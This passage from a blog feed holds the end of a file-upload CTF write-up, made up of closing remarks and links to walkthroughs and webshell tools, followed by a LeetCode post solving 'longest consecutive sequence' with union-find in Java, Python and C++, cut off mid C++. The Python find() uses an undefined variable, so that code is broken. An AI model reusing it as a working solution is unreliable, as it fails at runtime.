不得不说，互联网中有非常多可用的资源，但却有着许多滥竽充数和敷衍了事，当利用搜索引擎自学时，绝大部分时间就会花在对内容的筛选上。我也不清楚用实战回填知识的方法究竟可不可取，但是至少在本篇期间，文件上传相关概念如洪水猛兽般袭来。不说熟悉掌握了所有知识点，至少不会再让后期的学习存在更多的未知。毕竟，正如笔记中所记录的，任何关卡都没有满足于夺旗，而是如实地记录并解决所遇到的一切问题。</p><p>  由于学校近期任务也越来越多，因此博文基本都是挤时间完成的，前前后后磨了一个多星期，可能会有一些地方不合逻辑甚至出现胡言乱语，如果在这茫茫互联网的小角落有幸被你发现，也请谅解。</p><p>  最后，终于能说出第一关就想说的那句，完结撒花🎉请网安人继续前行！</p><h2 id="参考链接">参考链接</h2><div>    <ol>        <li><a href='https://www.cnblogs.com/chu-jian/p/15515770.html'>upload-labs通关攻略（全）</a><text style="font-size: 75%;"> - 清茶先生，2021-11-07</text></li>        <li><a href='https://www.anquanclub.cn/759.html'>buu刷题笔记之文件上传漏洞全集-Upload-labs通关手册</a><text style="font-size: 75%;"> - 沐寒，2022-02-28</text></li>        <li><a href='https://blog.csdn.net/weixin_47598409/article/details/115050869'>Upload-labs 1-21关 靶场通关攻略(全网最全最完整)</a><text style="font-size: 75%;"> - 晚安這個未知的世界，2021-03-21</text></li>        <li><a href='https://www.caicaizi.top/archives/493'>Upload-labs通关详解</a><text style="font-size: 75%;"> - Q_ray，2021-03-21</text></li>        <li><a href='https://www.smi1e.top/2019/02/07/upload-labs-20%E5%85%B3%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/'>Upload-labs 20关通关笔记</a><text style="font-size: 75%;"> - Smi1e，2019-02-07</text></li>        <li><a href='https://blog.csdn.net/Thunderclap_/article/details/108948611'>upload-labs文件上传靶场实验通关教程攻略</a><text style="font-size: 75%;"> - Thunder_sec，2020-10-07</text></li>        <li><a href='https://www.sqlsec.com/2020/10/upload.html'>国光的文件上传靶场知识总结</a><text style="font-size: 75%;"> - 国光，2020-10-25</text></li>        <li><a href='https://www.runoob.com/php/php-tutorial.html'>PHP 教程</a><text style="font-size: 75%;"> - 菜鸟教程</text></li>        <li><a href='https://stackoverflow.com/questions/701882/what-is-ansi-format'>What is ANSI format?</a><text style="font-size: 75%;"> - Stack Overflow，2015-05-14</text></li>        <li><a href='https://www.php.net/manual/zh/index.php'>PHP 手册</a><text style="font-size: 75%;"> - Manual，2022-05-25</text></li>        <li><a href='http://www.jinbuguo.com/php/php.ini.html'>php.ini 中文版 (PHP7,PHP8)</a><text style="font-size: 75%;"> - 金步国</text></li>        <li><a href='https://www.cnblogs.com/lidabo/p/3701197.html'>PNG文件结构分析</a><text style="font-size: 75%;"> - DoubleLi，2014-04-30</text></li>        <li><a href='https://blog.csdn.net/wzy198852/article/details/17266507'>gif 格式图片详细解析结</a><text style="font-size: 75%;"> - C_peter，2013-12-11</text></li>        <li><a href='https://github.com/monstra-cms/monstra/issues/429'>Some extension can bypassed...</a><text style="font-size: 75%;"> - monstra-cms/monstra(github.com)，2018-01-29</text></li>        <li><a href='https://wenku.baidu.com/view/8ea0fbfb04a1b0717fd5dd57.html'>JPEG 文件数据结构以及将位图保存为JPG 的代码</a><text style="font-size: 75%;"> - 百度文库</text></li>        <li><a href='https://github.com/AntSwordProject/antSword/blob/master/README_CN.md'>中国蚁剑</a><text style="font-size: 75%;"> - (github.com)，2021-07-25</text></li>        <li><a href='https://www.cnblogs.com/lxfweb/p/14847358.html'>上传靶机实战之upload-labs解题</a><text style="font-size: 75%;"> - 雪痕，2021-06-03</text></li>        <li><a href='http://www.libpng.org/pub/png/'>PNG (Portable Network Graphics) Home Site</a><text style="font-size: 75%;"></text></li>        <li><a href='https://libgd.github.io/manuals/2.3.1/files/preamble-txt.html'>About LibGD 2.3.1</a><text style="font-size: 75%;"></text></li>        <li><a href='https://zhuanlan.kanxue.com/article-13074.htm'>php imagecreatefrom* 系列函数之 png</a><text style="font-size: 75%;"> - janes，2016-05-20</text></li>        <li><a href='https://www.cnblogs.com/linfangnan/p/13588709.html'>CTF-WEB：文件上传和 webshellg</a><text style="font-size: 75%;"> - 乌漆WhiteMoon，2020-09-01</text></li>        <li><a href='https://windows.php.net/downloads/releases/archives/'>windows.php.net</a><text style="font-size: 75%;"></text></li>        <li><a href='https://stackoverflow.com/questions/52964319/c-apache24-conf-httpd-conf-cannot-load-c-php7-php7apache2-dll-into-server-th'>php - C:/Apache24/conf/httpd...</a><text style="font-size: 75%;"> - Stack Overflow，2018-10-24</text></li>        <li><a href='https://blog.51cto.com/u_15127661/4081404'>Apache解析漏洞详解</a><text style="font-size: 75%;"> - mob60475700baf7，2016-01-09</text></li>        <li><a href='https://www.lirongyaoper.com/phpxiangguan/41.html'>CGI、FastCGI和PHP-FPM关系图解</a><text style="font-size: 75%;"> - 荣耀历程，2020-10-24</text></li>        <li><a href='https://qastack.cn/superuser/782692/opened-a-jpg-picture-with-notepad-pasted-all-the-text-to-a-new-notepad-file-changed-to-jpg-and-it-no-longer-opens-why'>使用记事本打开JPG图片，将所有“文本”粘...</a><text style="font-size: 75%;"> - qastack.cn</text></li>        <li><a href='https://www.365seal.com/y/2rndogOPpj.html'>php安装（以module方式）</a><text style="font-size: 75%;"> - dgh00，2010-11-27</text></li>        <li><a href='https://blog.css8.cn/post/17165113.html'>7z apache解析漏洞_upload-labs打关详解</a><text style="font-size: 75%;"> - 白红宇，2021-10-21</text></li>        <li><a href='https://httpd.apache.org/docs/'>Apache HTTP 服务器文档</a><text style="font-size: 75%;"></text></li>        <li><a href='https://www.cnblogs.com/gwind/p/8215771.html'>各种类型文件头标准编码</a><text style="font-size: 75%;"> - gwind，2018-01-06</text></li>    </ol></div>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode 刷题笔记——并查集</title>
      <link href="/posts/d575d62b/"/>
      <url>/posts/d575d62b/</url>
      
        <content type="html"><![CDATA[<h1>LeetCode 刷题笔记——并查集</h1><blockquote><p><strong>前言</strong></p><p>上一篇博客中完成了并查集的学习，仅仅学个理论基础肯定是不够的，因此针对并查集继续进行同步练习，依旧在 <strong><a href="https://leetcode-cn.com/">LeetCode</a></strong> 平台刷题，并记录在此。</p></blockquote><h2 id="128-最长连续序列"><a href="https://leetcode-cn.com/problems/longest-consecutive-sequence/">128. 最长连续序列</a></h2><p>难度：中等</p><p>给定一个未排序的整数数组 <code>nums</code> ，找出数字连续的最长序列（不要求序列元素在原数组中连续）的长度。</p><p>请你设计并实现时间复杂度为 <code>O(n)</code> 的算法解决此问题。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [100,4,200,1,3,2]</span><br><span class="line">输出：4</span><br><span class="line">解释：最长数字连续序列是 [1, 2, 3, 4]。它的长度为 4。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [0,3,7,2,5,8,4,6,0,1]</span><br><span class="line">输出：9</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>0 &lt;= nums.length &lt;= 105</code></li><li><code>-109 &lt;= nums[i] &lt;= 109</code></li></ul><h3 id="解题思路">解题思路</h3><p>既然训练并查集，当然首先考虑能否用并查集解题。题目要求查找最长的连续序列，那么我们就可以认为，相邻的两个数 <strong>相连</strong> ，那最长的连续序列其实就相当于求并查集中的最大连通分量。我们可以先列出之前完成的并查集的 API 表：</p><table><thead><tr><th style="text-align:center">API</th><th style="text-align:center">备注</th></tr></thead><tbody><tr><td style="text-align:center">void union_find(int N)</td><td style="text-align:center">初始化</td></tr><tr><td style="text-align:center">void union(int p, int q)</td><td style="text-align:center">连接 p, q</td></tr><tr><td style="text-align:center">int find(int p)</td><td style="text-align:center">返回标识</td></tr><tr><td style="text-align:center">boolean connected(int p, int q)</td><td style="text-align:center">判断 p, q 是否相连</td></tr></tbody></table><p>需要解决的第一个问题是，我们的并查集内的初始序列是一串连续且从 0 开始的整数，如何将这样的序列一一映射到我们输入的随机排列的序列呢？一个简单的思路是将输入的序列存放在并查集算法以外的数组里，这样在并查集算法中的内部序列其实就是外部随机序列所对应的索引，我们只需把连续的两个数的索引传给 <code>union()</code> 方法即可。</p><p>那么第二个问题就来了，现在我们可以完成连通分量的划分，但是我们并没有计算连通分量中元素个数的方法。为此我们有必要使用一个辅助数组用来存储连通分量中的元素个数，并增加一个返回<strong>最大个数</strong>值的方法，我们称之为 <code>GetMax()</code> 。</p><h3 id="具体实现">具体实现</h3><p>存储连通分量的元素数量的数组应该如何实现呢？还记得在并查集算法中，我们为了提升性能引入了一个辅助数组 <code>sz[]</code> ，里面存储的就是当前连通分量的元素数量（因为我们需要总是将较小分量连接到较大分量）。因此，直接使用 <code>GetMax()</code> 方法返回数组 <code>sz[]</code> 中的最大元素即可，当然，当输入序列的长度小于 2 的话，我们只需返回序列长度值即可（在入口处直接判断即可）。实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//在 Solution 类中！</span></span><br><span class="line">    <span class="keyword">int</span> N = nums.length;</span><br><span class="line"><span class="keyword">if</span> (N &lt; <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> N;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">GetMax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//在 union_find 类中！</span></span><br><span class="line">    <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sz.length; i++)</span><br><span class="line">        max = Math.max(max, sz[i]);</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过，这样就必须额外遍历一遍 <code>sz[]</code> 数组了，其实我们可以新增一个内部变量 <code>M</code> 用来存储最大元素数量，而将更新 <code>M</code> 的操作放在我们更新 <code>sz[]</code> 数组的同时，这样，就不要在调用 <code>GetMax()</code> 方法时进行额外的遍历了，且时间复杂度也低于完整遍历。值得注意的是，<code>M</code> 的初始值应为<strong>1</strong>，因为如果程序运行过程中不创建新连接时，即不调用 <code>union()</code> 方法时，<code>M</code> 值将不会更新，而此时 <code>M</code> 值应为<strong>1</strong>（<code>M</code> 当且仅当输入序列为空时值为零，这种情况已由程序入口处判断长度语句过滤）。实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> M = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pRoot = find(p);</span><br><span class="line">    <span class="keyword">int</span> qRoot = find(q);</span><br><span class="line">    <span class="keyword">if</span> (sz[pRoot] &lt; sz[qRoot]) &#123;</span><br><span class="line">        id[pRoot] = qRoot;</span><br><span class="line">        sz[qRoot] += sz[pRoot];</span><br><span class="line">        M = Math.max(M, sz[qRoot]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        id[qRoot] = pRoot;</span><br><span class="line">        sz[pRoot] += sz[qRoot];</span><br><span class="line">        M = Math.max(M, sz[pRoot]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">GetMax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> M;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么接下来要解决的，就是如何将值相邻的两个数提取出来并传给 <code>union()</code> 方法。不考虑性能的话，直接遍历完全可以解决，即取其中一个数，然后再遍历寻找与他相邻的数。但是，这样显然过于粗鲁。当我们取一个数的时候，其实我们就已经知道与他相邻的唯二可能值了，因此我们需要的只是已知值的索引而已。而要满足这个需求，我们可以直接使用哈希表。每次取一个值并判断相邻元素是否存在，若存在则传给 <code>union()</code> 方法。实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; m = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span> N = nums.length;</span><br><span class="line">    <span class="keyword">if</span> (N &lt; <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> N;</span><br><span class="line">    union_find uf = <span class="keyword">new</span> union_find(N);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (m.containsKey(nums[i])) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (m.containsKey(nums[i] - <span class="number">1</span>)) </span><br><span class="line">            uf.union(i, m.get(nums[i] - <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">if</span> (m.containsKey(nums[i] + <span class="number">1</span>)) </span><br><span class="line">            uf.union(i, m.get(nums[i] + <span class="number">1</span>));</span><br><span class="line">        m.put(nums[i], i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> uf.GetMax();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上，我们就成功使用并查集解决了这道问题，源代码与其他语言实现在下方给出。</p><h3 id="源代码">源代码</h3><div class="tabs" id="text"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#text-1"><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#h-t-m-java"></use></svg>Java</button></li><li class="tab"><button type="button" data-href="#text-2"><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#h-t-m-Python"></use></svg>Python</button></li><li class="tab"><button type="button" data-href="#text-3"><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#h-t-m-a-c"></use></svg>C++</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="text-1"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; m = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> N = nums.length;</span><br><span class="line">        <span class="keyword">if</span> (N &lt; <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> N;</span><br><span class="line">        union_find uf = <span class="keyword">new</span> union_find(N);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (m.containsKey(nums[i])) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (m.containsKey(nums[i] - <span class="number">1</span>)) </span><br><span class="line">                uf.union(i, m.get(nums[i] - <span class="number">1</span>));</span><br><span class="line">            <span class="keyword">if</span> (m.containsKey(nums[i] + <span class="number">1</span>)) </span><br><span class="line">                uf.union(i, m.get(nums[i] + <span class="number">1</span>));</span><br><span class="line">            m.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> uf.GetMax();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">union_find</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] sz;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> M = <span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">union_find</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">        id = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        sz = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">            id[i] = i;</span><br><span class="line">            sz[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = p;</span><br><span class="line">        <span class="keyword">while</span> (p != id[p]) p = id[p];</span><br><span class="line">        <span class="keyword">while</span> (tmp != id[tmp]) &#123;</span><br><span class="line">            <span class="keyword">int</span> t = tmp;</span><br><span class="line">            tmp = id[tmp];</span><br><span class="line">            id[t] = p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pRoot = find(p);</span><br><span class="line">        <span class="keyword">int</span> qRoot = find(q);</span><br><span class="line">        <span class="keyword">if</span> (sz[pRoot] &lt; sz[qRoot]) &#123;</span><br><span class="line">            id[pRoot] = qRoot;</span><br><span class="line">            sz[qRoot] += sz[pRoot];</span><br><span class="line">            M = Math.max(M, sz[qRoot]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            id[qRoot] = pRoot;</span><br><span class="line">            sz[pRoot] += sz[qRoot];</span><br><span class="line">            M = Math.max(M, sz[pRoot]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">GetMax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> M;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="text-2"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 小白尝试，代码简陋，不做参考</span></span><br><span class="line"><span class="comment"># 会改的会改的</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">quick_union</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, N</span>):</span></span><br><span class="line">        self.<span class="built_in">id</span> = <span class="built_in">list</span>(<span class="built_in">range</span>(N))</span><br><span class="line">        self.sz = [<span class="number">1</span>]*N</span><br><span class="line">        self.M = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connected</span>(<span class="params">self, p, q</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.find(p) == self.find(q)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span>(<span class="params">self, p</span>):</span></span><br><span class="line">        <span class="keyword">while</span> p != self.<span class="built_in">id</span>[p]:</span><br><span class="line">            p = self.<span class="built_in">id</span>[p]</span><br><span class="line">        <span class="keyword">while</span> tmp != self.<span class="built_in">id</span>[tmp]:</span><br><span class="line">            t = tmp</span><br><span class="line">            tmp = self.<span class="built_in">id</span>[tmp]</span><br><span class="line">            self.<span class="built_in">id</span>[t] = p</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">union</span>(<span class="params">self, p, q</span>):</span></span><br><span class="line">        pR = self.find(p)</span><br><span class="line">        qR = self.find(q)</span><br><span class="line">        <span class="keyword">if</span> self.sz[pR] &lt; self.sz[qR]:</span><br><span class="line">            self.<span class="built_in">id</span>[pR] = qR</span><br><span class="line">            self.sz[qR] += self.sz[pR]</span><br><span class="line">            self.M = <span class="built_in">max</span>(self.M, self.sz[qR])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.<span class="built_in">id</span>[qR] = pR</span><br><span class="line">            self.sz[pR] += self.sz[qR]</span><br><span class="line">            self.M = <span class="built_in">max</span>(self.M, self.sz[pR])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetMax</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.M</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestConsecutive</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        N = <span class="built_in">len</span>(nums)</span><br><span class="line">        <span class="keyword">if</span> N &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> N</span><br><span class="line">        qu = quick_union(N)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">            <span class="keyword">if</span> nums[i] <span class="keyword">in</span> d.keys():</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> nums[i] - <span class="number">1</span> <span class="keyword">in</span> d.keys():</span><br><span class="line">                qu.union(i, d[nums[i] - <span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> nums[i] + <span class="number">1</span> <span class="keyword">in</span> d.keys():</span><br><span class="line">                qu.union(i, d[nums[i] + <span class="number">1</span>])</span><br><span class="line">            d[nums[i]] = i</span><br><span class="line">        <span class="keyword">return</span> qu.GetMax()</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="text-3"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">union_find</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span>* id;</span><br><span class="line"><span class="keyword">int</span>* sz;</span><br><span class="line"><span class="keyword">int</span> M = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">union_find</span>(<span class="keyword">int</span> N) &#123;</span><br><span class="line">id = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">sz = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">id[i] = i;</span><br><span class="line">sz[i] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">union_find</span>();</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> tem = p;</span><br><span class="line"><span class="keyword">while</span> (p != id[p]) p = id[p];</span><br><span class="line"><span class="keyword">while</span> (tem != id[tem]) &#123;</span><br><span class="line"><span class="keyword">int</span> t = tem;</span><br><span class="line">tem = id[tem];</span><br><span class="line">id[t] = p;</span><br><span class="line">&#125;</span><br><span class="line"><span 